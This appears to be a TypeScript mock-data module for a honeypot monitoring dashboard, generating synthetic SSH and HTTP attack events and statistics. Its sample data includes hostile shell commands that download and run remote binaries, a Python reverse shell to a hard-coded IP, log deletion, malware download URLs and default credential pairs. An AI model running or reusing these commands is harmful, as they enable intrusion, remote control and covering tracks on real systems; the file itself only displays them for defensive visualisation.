import type {
  CredentialCount,
  EventListResponse,
  EventOut,
  EventQuery,
  GeoInfo,
  Health,
  PayloadCount,
  Severity,
  SourceCount,
  Stats,
  Timeseries,
  TimeseriesPoint,
  WindowKey,
} from "../types";
import { SEVERITY_ORDER } from "../lib/severity";

/* ------------------------------------------------------------------ */
/* Deterministic-ish helpers                                           */
/* ------------------------------------------------------------------ */

const DAY = 86_400_000;
const WINDOW_MS: Record<WindowKey, number> = {
  "15m": 900_000,
  "1h": 3_600_000,
  "6h": 21_600_000,
  "24h": 86_400_000,
  "7d": 604_800_000,
};

const BUCKET_SECONDS: Record<WindowKey, number> = {
  "15m": 60,
  "1h": 300,
  "6h": 900,
  "24h": 3600,
  "7d": 21600,
};

interface Weighted<T> {
  value: T;
  weight: number;
}

function chance(probability: number): boolean {
  return Math.random() < probability;
}

function pick<T>(items: readonly T[]): T {
  return items[Math.floor(Math.random() * items.length)];
}

function weighted<T>(items: readonly Weighted<T>[]): T {
  const total = items.reduce((sum, item) => sum + item.weight, 0);
  let roll = Math.random() * total;
  for (const item of items) {
    roll -= item.weight;
    if (roll <= 0) return item.value;
  }
  return items[items.length - 1].value;
}

/** Deterministic 64-hex digest shape for demo hashes (never a real credential). */
function fakeSha256(seed: string): string {
  const state = [
    0x811c9dc5, 0x9e3779b9, 0x85ebca6b, 0xc2b2ae35, 0x27d4eb2f, 0x165667b1,
    0xd3a2646c, 0x1b873593,
  ];
  for (let index = 0; index < seed.length; index += 1) {
    const code = seed.charCodeAt(index);
    for (let lane = 0; lane < state.length; lane += 1) {
      state[lane] ^= code + lane;
      state[lane] = Math.imul(state[lane], 16_777_619 + lane * 4) >>> 0;
      state[lane] ^= state[lane] >>> 13;
    }
  }
  return `sha256:${state.map((lane) => lane.toString(16).padStart(8, "0")).join("")}`;
}

/* ------------------------------------------------------------------ */
/* Source / credential / payload pools                                 */
/* ------------------------------------------------------------------ */

interface Source {
  ip: string;
  country: string;
  region: string;
  city: string;
  latitude: number;
  longitude: number;
  asn: string;
}

const SOURCES: readonly Source[] = [
  { ip: "185.220.101.44", country: "Russia", region: "Moscow", city: "Moscow", latitude: 55.75, longitude: 37.62, asn: "AS20912" },
  { ip: "45.155.205.233", country: "Netherlands", region: "North Holland", city: "Amsterdam", latitude: 52.37, longitude: 4.9, asn: "AS1101" },
  { ip: "193.32.162.87", country: "Germany", region: "Hesse", city: "Frankfurt", latitude: 50.11, longitude: 8.68, asn: "AS24940" },
  { ip: "141.98.10.22", country: "Bulgaria", region: "Sofia", city: "Sofia", latitude: 42.7, longitude: 23.32, asn: "AS9002" },
  { ip: "218.92.0.33", country: "China", region: "Jiangsu", city: "Nanjing", latitude: 32.06, longitude: 118.8, asn: "AS4134" },
  { ip: "61.177.172.9", country: "China", region: "Jiangsu", city: "Suzhou", latitude: 31.3, longitude: 120.6, asn: "AS4134" },
  { ip: "222.186.30.112", country: "China", region: "Guangdong", city: "Shenzhen", latitude: 22.54, longitude: 114.06, asn: "AS4134" },
  { ip: "5.188.206.14", country: "Russia", region: "Moscow", city: "Moscow", latitude: 55.76, longitude: 37.64, asn: "AS49505" },
  { ip: "89.248.165.52", country: "Netherlands", region: "Flevoland", city: "Almere", latitude: 52.37, longitude: 5.21, asn: "AS202425" },
  { ip: "167.94.138.33", country: "United States", region: "Michigan", city: "Ann Arbor", latitude: 42.28, longitude: -83.74, asn: "AS14618" },
  { ip: "159.223.98.12", country: "Singapore", region: "Singapore", city: "Singapore", latitude: 1.35, longitude: 103.82, asn: "AS14061" },
  { ip: "20.169.14.77", country: "United States", region: "Virginia", city: "Ashburn", latitude: 39.04, longitude: -77.49, asn: "AS8075" },
  { ip: "43.134.12.9", country: "Singapore", region: "Singapore", city: "Singapore", latitude: 1.29, longitude: 103.85, asn: "AS132203" },
  { ip: "103.75.201.4", country: "Vietnam", region: "Hanoi", city: "Hanoi", latitude: 21.03, longitude: 105.85, asn: "AS45899" },
  { ip: "197.210.84.2", country: "Nigeria", region: "Lagos", city: "Lagos", latitude: 6.52, longitude: 3.38, asn: "AS29465" },
  { ip: "177.54.144.18", country: "Brazil", region: "Sao Paulo", city: "Sao Paulo", latitude: -23.55, longitude: -46.63, asn: "AS28573" },
  { ip: "103.145.13.77", country: "India", region: "Maharashtra", city: "Mumbai", latitude: 19.07, longitude: 72.87, asn: "AS55836" },
  { ip: "203.159.80.55", country: "Thailand", region: "Bangkok", city: "Bangkok", latitude: 13.75, longitude: 100.5, asn: "AS23969" },
  { ip: "185.7.214.11", country: "Ukraine", region: "Kyiv", city: "Kyiv", latitude: 50.45, longitude: 30.52, asn: "AS6849" },
  { ip: "88.247.42.6", country: "Turkey", region: "Istanbul", city: "Istanbul", latitude: 41.01, longitude: 28.98, asn: "AS9121" },
  { ip: "36.91.44.130", country: "Indonesia", region: "Jakarta", city: "Jakarta", latitude: -6.21, longitude: 106.85, asn: "AS7713" },
  { ip: "185.234.219.9", country: "Poland", region: "Masovia", city: "Warsaw", latitude: 52.23, longitude: 21.01, asn: "AS5617" },
  { ip: "86.106.74.20", country: "Romania", region: "Bucharest", city: "Bucharest", latitude: 44.43, longitude: 26.1, asn: "AS8708" },
  { ip: "102.132.44.8", country: "South Africa", region: "Gauteng", city: "Johannesburg", latitude: -26.2, longitude: 28.05, asn: "AS37457" },
  { ip: "181.164.12.7", country: "Argentina", region: "Buenos Aires", city: "Buenos Aires", latitude: -34.6, longitude: -58.38, asn: "AS7303" },
  { ip: "189.203.55.4", country: "Mexico", region: "Mexico City", city: "Mexico City", latitude: 19.43, longitude: -99.13, asn: "AS28469" },
  { ip: "99.229.14.63", country: "Canada", region: "Ontario", city: "Toronto", latitude: 43.65, longitude: -79.38, asn: "AS812" },
  { ip: "133.18.44.21", country: "Japan", region: "Tokyo", city: "Tokyo", latitude: 35.68, longitude: 139.69, asn: "AS2516" },
  { ip: "203.24.108.14", country: "Australia", region: "New South Wales", city: "Sydney", latitude: -33.87, longitude: 151.21, asn: "AS13335" },
  { ip: "5.144.180.9", country: "Iran", region: "Tehran", city: "Tehran", latitude: 35.69, longitude: 51.39, asn: "AS58224" },
  { ip: "195.158.8.44", country: "Moldova", region: "Chisinau", city: "Chisinau", latitude: 47.01, longitude: 28.86, asn: "AS25408" },
  { ip: "45.61.184.33", country: "Panama", region: "Panama", city: "Panama City", latitude: 8.98, longitude: -79.52, asn: "AS18809" },
];

interface Credential {
  username: string;
  hash: string;
}

const RAW_CREDENTIALS: ReadonlyArray<readonly [string, string]> = [
  ["root", "123456"],
  ["root", "P@ssw0rd!"],
  ["admin", "admin"],
  ["admin", "admin123"],
  ["ubuntu", "ubuntu"],
  ["oracle", "oracle"],
  ["pi", "raspberry"],
  ["user", "password"],
  ["test", "test123"],
  ["postgres", "postgres"],
  ["git", "git"],
  ["deploy", "changeme"],
  ["www-data", "www-data"],
  ["jenkins", "jenkins"],
  ["support", "support"],
  ["guest", "guest"],
  ["mysql", "mysql"],
  ["ftpuser", "ftpuser"],
  ["ansible", "ansible"],
  ["docker", "docker"],
];

const CREDENTIALS: readonly Credential[] = RAW_CREDENTIALS.map(
  ([username, password]) => ({
    username,
    hash: fakeSha256(`${username}:${password}`),
  }),
);

const SCAN_PATHS = [
  "/",
  "/index.html",
  "/robots.txt",
  "/sitemap.xml",
  "/.well-known/security.txt",
  "/actuator/health",
  "/server-status",
  "/health",
  "/api/v1/health",
  "/config.json",
  "/backup.zip",
  "/api/../etc/passwd",
  "/boaform/admin/formLogin",
  "/cgi-bin/luci",
  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
] as const;

const EXPLOIT_PATHS = [
  "/wp-login.php",
  "/wp-admin/admin-ajax.php",
  "/xmlrpc.php",
  "/phpmyadmin/index.php",
  "/.env",
  "/.git/config",
  "/shell.php",
  "/login",
  "/manager/html",
  "/console/login/LoginForm.jsp",
  "/hudson/script",
  "/api/v1/login",
] as const;

const VALID_PATHS = ["/login", "/api/v1/login", "/admin/login", "/wp-login.php"] as const;

const HTTP_METHODS: readonly Weighted<string>[] = [
  { value: "GET", weight: 58 },
  { value: "POST", weight: 29 },
  { value: "HEAD", weight: 6 },
  { value: "OPTIONS", weight: 4 },
  { value: "PUT", weight: 3 },
];

const HTTP_STATUS: readonly Weighted<number>[] = [
  { value: 200, weight: 34 },
  { value: 404, weight: 28 },
  { value: 403, weight: 18 },
  { value: 401, weight: 14 },
  { value: 500, weight: 6 },
];

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "curl/8.5.0",
  "python-requests/2.31.0",
  "Go-http-client/1.1",
  "masscan/1.3",
  "zgrab/0.x",
  "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
] as const;

const SSH_CLIENTS = [
  "SSH-2.0-libssh_0.10.6",
  "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
  "SSH-2.0-Go",
  "SSH-2.0-PuTTY_Release_0.80",
] as const;

const COMMANDS = [
  "uname -a; id",
  "cat /etc/passwd",
  "ls -la /var/www",
  "wget http://45.155.205.233/ldr.sh -O /tmp/ldr.sh; chmod +x /tmp/ldr.sh; /tmp/ldr.sh",
  "curl -fsSL http://185.220.101.44/bins/x86_64 -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
  "chmod 777 /tmp && cd /tmp && ./mirai.x",
  "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"45.61.184.33\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'",
  "rm -rf /var/log/auth.log",
  "docker ps -a",
  "crontab -l",
] as const;

interface Payload {
  url: string;
  size: number;
}

const PAYLOADS: readonly Payload[] = [
  { url: "http://185.220.101.44/bins/x86_64", size: 1_179_648 },
  { url: "http://45.155.205.233/ldr.sh", size: 2_848 },
  { url: "https://198.51.100.7/payload.elf", size: 348_160 },
  { url: "http://193.32.162.87/dropper/mirai.arm7", size: 96_256 },
  { url: "http://5.188.206.14/c2/beacon.ps1", size: 12_402 },
  { url: "https://203.0.113.45/update.bin", size: 2_097_152 },
  { url: "http://141.98.10.22/.cache/kworker", size: 4_718_592 },
  { url: "http://91.240.118.15/miner/xmrig", size: 3_355_443 },
];

/* ------------------------------------------------------------------ */
/* Event synthesis                                                     */
/* ------------------------------------------------------------------ */

const SEVERITY_WEIGHTS: Record<string, readonly Weighted<Severity>[]> = {
  T1110: [
    { value: "low", weight: 12 },
    { value: "medium", weight: 56 },
    { value: "high", weight: 27 },
    { value: "critical", weight: 5 },
  ],
  "T1110.004": [
    { value: "medium", weight: 20 },
    { value: "high", weight: 55 },
    { value: "critical", weight: 25 },
  ],
  T1595: [
    { value: "low", weight: 58 },
    { value: "medium", weight: 36 },
    { value: "high", weight: 6 },
  ],
  T1190: [
    { value: "medium", weight: 16 },
    { value: "high", weight: 50 },
    { value: "critical", weight: 34 },
  ],
  T1105: [
    { value: "medium", weight: 8 },
    { value: "high", weight: 47 },
    { value: "critical", weight: 45 },
  ],
  T1059: [
    { value: "medium", weight: 14 },
    { value: "high", weight: 55 },
    { value: "critical", weight: 31 },
  ],
  T1078: [
    { value: "medium", weight: 44 },
    { value: "high", weight: 44 },
    { value: "critical", weight: 12 },
  ],
};

const EVENT_KINDS: readonly Weighted<
  "ssh" | "scan" | "exploit" | "transfer" | "command" | "valid"
>[] = [
  { value: "ssh", weight: 42 },
  { value: "scan", weight: 21 },
  { value: "exploit", weight: 16 },
  { value: "transfer", weight: 9 },
  { value: "command", weight: 7 },
  { value: "valid", weight: 5 },
];

function pickSeverity(technique: string): Severity {
  return weighted(SEVERITY_WEIGHTS[technique] ?? SEVERITY_WEIGHTS.T1110);
}

function baseEvent(timestamp: number, source: Source): EventOut {
  return {
    service: "ssh",
    source_ip: source.ip,
    timestamp: new Date(timestamp).toISOString(),
    login_info: null,
    user_agent: null,
    http_method: null,
    http_path: null,
    http_status_code: null,
    command: null,
    payload_url: null,
    payload_hash: null,
    payload_size: null,
    geo_info: chance(0.92)
      ? {
          country: source.country,
          region: source.region,
          city: source.city,
          latitude: source.latitude,
          longitude: source.longitude,
          asn: source.asn,
        }
      : null,
    technique_id: "T1110",
    severity: "medium",
  };
}

function withPayload(event: EventOut): EventOut {
  const payload = pick(PAYLOADS);
  return {
    ...event,
    payload_url: payload.url,
    payload_hash: fakeSha256(payload.url),
    payload_size: payload.size,
    technique_id: "T1105",
    severity: pickSeverity("T1105"),
  };
}

function generateEvent(timestamp: number): EventOut {
  const source = pick(SOURCES);
  const base = baseEvent(timestamp, source);
  const kind = weighted(EVENT_KINDS);

  if (kind === "ssh" || kind === "command") {
    const credential = pick(CREDENTIALS);
    const technique = kind === "ssh" && chance(0.28) ? "T1110.004" : "T1110";
    let event: EventOut = {
      ...base,
      service: "ssh",
      login_info: { username: credential.username, password_hash: credential.hash },
      user_agent: pick(SSH_CLIENTS),
      technique_id: technique,
      severity: pickSeverity(technique),
    };

    if (kind === "command" || chance(0.06)) {
      event = {
        ...event,
        command: pick(COMMANDS),
        technique_id: "T1059",
        severity: pickSeverity("T1059"),
      };
      if (event.command?.includes("http") || chance(0.35)) {
        event = withPayload(event);
      }
    }
    return event;
  }

  if (kind === "valid") {
    const credential = pick(CREDENTIALS);
    const path = pick(VALID_PATHS);
    return {
      ...base,
      service: "http",
      user_agent: pick(USER_AGENTS),
      http_method: "POST",
      http_path: path,
      http_status_code: 200,
      login_info: { username: credential.username, password_hash: credential.hash },
      technique_id: "T1078",
      severity: pickSeverity("T1078"),
    };
  }

  const method = weighted(HTTP_METHODS);
  const status = weighted(HTTP_STATUS);

  if (kind === "transfer") {
    const event = withPayload({
      ...base,
      service: "http",
      user_agent: pick(USER_AGENTS),
      http_method: method,
      http_path: pick(["/shell.php", "/upload", "/cgi-bin/luci", "/wp-content/plugins/x.php"]),
      http_status_code: chance(0.55) ? 200 : status,
    });
    return event;
  }

  if (kind === "exploit") {
    return {
      ...base,
      service: "http",
      user_agent: pick(USER_AGENTS),
      http_method: method === "GET" ? "POST" : method,
      http_path: pick(EXPLOIT_PATHS),
      http_status_code: status,
      technique_id: "T1190",
      severity: pickSeverity("T1190"),
      ...(chance(0.12)
        ? { command: pick(COMMANDS), technique_id: "T1059", severity: pickSeverity("T1059") }
        : {}),
    };
  }

  return {
    ...base,
    service: "http",
    user_agent: pick(USER_AGENTS),
    http_method: method,
    http_path: pick(SCAN_PATHS),
    http_status_code: status,
    technique_id: "T1595",
    severity: pickSeverity("T1595"),
  };
}

/* ------------------------------------------------------------------ */
/* Store: 7 d synthetic history + a 500-event live ring buffer          */
/* ------------------------------------------------------------------ */

const HISTORY_COUNT = 2_800;
const LIVE_CAP = 500;

let history: EventOut[] | null = null;
let live: EventOut[] = [];
const listeners = new Set<(event: EventOut) => void>();
let liveTimer: ReturnType<typeof setTimeout> | null = null;
const startedAt = Date.now();

function ensureSeeded(): void {
  if (history) return;
  const now = Date.now();
  const seeded: EventOut[] = [];
  for (let index = 0; index < HISTORY_COUNT; index += 1) {
    // Slight recency bias keeps the short windows busy like a real honeypot.
    const age = Math.pow(Math.random(), 1.65) * 7 * DAY;
    seeded.push(generateEvent(now - age - Math.random() * 20_000));
  }
  seeded.sort((a, b) => Date.parse(a.timestamp) - Date.parse(b.timestamp));
  history = seeded;
}

function allEvents(): EventOut[] {
  ensureSeeded();
  return [...(history ?? []), ...live];
}

function scheduleLive(): void {
  if (listeners.size === 0 || liveTimer !== null) return;
  const delay = 1000 + Math.random() * 1000;
  liveTimer = setTimeout(() => {
    liveTimer = null;
    const now = Date.now();
    const count = chance(0.16) ? 2 : 1;
    for (let index = 0; index < count; index += 1) {
      const event = generateEvent(now - index * 120);
      live.push(event);
      for (const listener of listeners) listener(event);
    }
    if (live.length > LIVE_CAP) live = live.slice(-LIVE_CAP);
    scheduleLive();
  }, delay);
}

/** Subscribe to the synthetic live feed. Returns an unsubscribe function. */
export function subscribeMockEvents(
  listener: (event: EventOut) => void,
): () => void {
  ensureSeeded();
  listeners.add(listener);
  scheduleLive();
  return () => {
    listeners.delete(listener);
    if (listeners.size === 0 && liveTimer !== null) {
      clearTimeout(liveTimer);
      liveTimer = null;
    }
  };
}

/* ------------------------------------------------------------------ */
/* Contract implementation                                             */
/* ------------------------------------------------------------------ */

export function mockGetHealth(): Health {
  return {
    status: "ok",
    db: "ok",
    version: "mock-1.0.0",
    uptime_s: Math.floor((Date.now() - startedAt) / 1000),
  };
}

export function mockGetEvents(params: EventQuery = {}): EventListResponse {
  const since = params.since ? Date.parse(params.since) : Number.NEGATIVE_INFINITY;
  const limit = Math.min(1000, Math.max(1, params.limit ?? 100));

  const items = allEvents()
    .filter((event) => {
      if (params.service && event.service !== params.service) return false;
      if (params.severity && event.severity !== params.severity) return false;
      if (params.technique && event.technique_id !== params.technique) return false;
      if (Date.parse(event.timestamp) <= since) return false;
      return true;
    })
    .sort((a, b) => Date.parse(b.timestamp) - Date.parse(a.timestamp))
    .slice(0, limit);

  return { items };
}

export function mockGetStats(window: WindowKey): Stats {
  const now = Date.now();
  const duration = WINDOW_MS[window] ?? WINDOW_MS["1h"];
  const start = now - duration;
  const previousStart = start - duration;

  const events = allEvents();
  const current = events.filter((event) => {
    const ts = Date.parse(event.timestamp);
    return ts >= start && ts <= now;
  });
  const previous = events.filter((event) => {
    const ts = Date.parse(event.timestamp);
    return ts >= previousStart && ts < start;
  });

  const serviceCounts = { ssh: 0, http: 0 };
  const severityCounts = { low: 0, medium: 0, high: 0, critical: 0 };
  const techniqueCounts = new Map<string, number>();
  const credentialCounts = new Map<string, CredentialCount>();
  const sourceCounts = new Map<string, SourceCount>();
  const pathCounts = new Map<string, number>();
  const payloadCounts = new Map<string, PayloadCount>();
  const uniqueSources = new Set<string>();
  const uniqueCredentials = new Set<string>();

  let payloadEvents = 0;
  let highOrCritical = 0;

  for (const event of current) {
    serviceCounts[event.service] += 1;
    uniqueSources.add(event.source_ip);
    if (event.severity) {
      severityCounts[event.severity] += 1;
      if (event.severity === "high" || event.severity === "critical") {
        highOrCritical += 1;
      }
    }
    if (event.technique_id) {
      techniqueCounts.set(
        event.technique_id,
        (techniqueCounts.get(event.technique_id) ?? 0) + 1,
      );
    }

    const login = event.login_info;
    if (login?.username && login.password_hash) {
      const key = `${login.username}|${login.password_hash}`;
      uniqueCredentials.add(key);
      const existing = credentialCounts.get(key);
      credentialCounts.set(key, {
        username: login.username,
        password_hash: login.password_hash,
        count: (existing?.count ?? 0) + 1,
        last_seen:
          !existing || event.timestamp > existing.last_seen
            ? event.timestamp
            : existing.last_seen,
      });
    }

    const source = sourceCounts.get(event.source_ip);
    const geo = event.geo_info;
    sourceCounts.set(event.source_ip, {
      source_ip: event.source_ip,
      country: geo?.country ?? source?.country ?? null,
      city: geo?.city ?? source?.city ?? null,
      latitude: geo?.latitude ?? source?.latitude ?? null,
      longitude: geo?.longitude ?? source?.longitude ?? null,
      asn: geo?.asn ?? source?.asn ?? null,
      count: (source?.count ?? 0) + 1,
      last_seen:
        !source || event.timestamp > source.last_seen
          ? event.timestamp
          : source.last_seen,
    });

    if (event.http_path) {
      pathCounts.set(
        event.http_path,
        (pathCounts.get(event.http_path) ?? 0) + 1,
      );
    }

    if (event.payload_url) {
      payloadEvents += 1;
      const existing = payloadCounts.get(event.payload_url);
      const hash = event.payload_hash ?? existing?.hash ?? null;
      payloadCounts.set(event.payload_url, {
        url: event.payload_url,
        hash,
        size: event.payload_size ?? existing?.size ?? null,
        quarantined: hash ? Number.parseInt(hash.slice(7, 9), 16) % 4 === 0 : false,
        first_seen:
          !existing || event.timestamp < existing.first_seen
            ? event.timestamp
            : existing.first_seen,
      });
    }
  }

  const byTechnique = [...techniqueCounts.entries()]
    .map(([technique_id, count]) => ({ technique_id, count }))
    .sort((a, b) => b.count - a.count || a.technique_id.localeCompare(b.technique_id));

  const topCredentials = [...credentialCounts.values()]
    .sort((a, b) => b.count - a.count || b.last_seen.localeCompare(a.last_seen))
    .slice(0, 5);

  const topSources = [...sourceCounts.values()]
    .sort((a, b) => b.count - a.count || b.last_seen.localeCompare(a.last_seen))
    .slice(0, 8);

  const topPaths = [...pathCounts.entries()]
    .map(([http_path, count]) => ({ http_path, count }))
    .sort((a, b) => b.count - a.count || a.http_path.localeCompare(b.http_path))
    .slice(0, 8);

  const payloads = [...payloadCounts.values()]
    .sort((a, b) => b.first_seen.localeCompare(a.first_seen))
    .slice(0, 6);

  const minutes = Math.max(duration / 60_000, 1 / 60);

  return {
    window,
    generated_at: new Date(now).toISOString(),
    totals: {
      events: current.length,
      events_previous: previous.length,
      events_per_minute: Math.round((current.length / minutes) * 100) / 100,
      unique_sources: uniqueSources.size,
      unique_credentials: uniqueCredentials.size,
      payloads: payloadEvents,
      high_or_critical: highOrCritical,
    },
    by_service: [
      { service: "ssh", count: serviceCounts.ssh },
      { service: "http", count: serviceCounts.http },
    ],
    by_severity: SEVERITY_ORDER.map((severity) => ({
      severity,
      count: severityCounts[severity],
    })),
    by_technique: byTechnique,
    top_credentials: topCredentials,
    top_sources: topSources,
    top_paths: topPaths,
    payloads,
  };
}

export function mockGetTimeseries(window: WindowKey): Timeseries {
  const bucketSeconds = BUCKET_SECONDS[window] ?? BUCKET_SECONDS["1h"];
  const bucketMs = bucketSeconds * 1000;
  const now = Date.now();
  const start = Math.floor((now - (WINDOW_MS[window] ?? WINDOW_MS["1h"])) / bucketMs) * bucketMs;
  const count = Math.ceil((now - start) / bucketMs) + 1;

  const points: TimeseriesPoint[] = Array.from({ length: count }, (_, index) => ({
    ts: new Date(start + index * bucketMs).toISOString(),
    total: 0,
    ssh: 0,
    http: 0,
    low: 0,
    medium: 0,
    high: 0,
    critical: 0,
  }));

  for (const event of allEvents()) {
    const ts = Date.parse(event.timestamp);
    if (ts < start || ts > now) continue;
    const index = Math.floor((ts - start) / bucketMs);
    const point = points[index];
    if (!point) continue;
    point.total += 1;
    point[event.service] += 1;
    if (event.severity) point[event.severity] += 1;
  }

  return { window, bucket_seconds: bucketSeconds, points };
}

/** Forces a fresh synthetic seed on the next read (used by tests/tools). */
export function resetMockState(): void {
  history = null;
  live = [];
  if (liveTimer !== null) {
    clearTimeout(liveTimer);
    liveTimer = null;
  }
}

export const MOCK_GEO_NOTE =
  "Synthetic geo data (no external GeoIP calls are made in mock mode).";

export type MockGeo = GeoInfo;
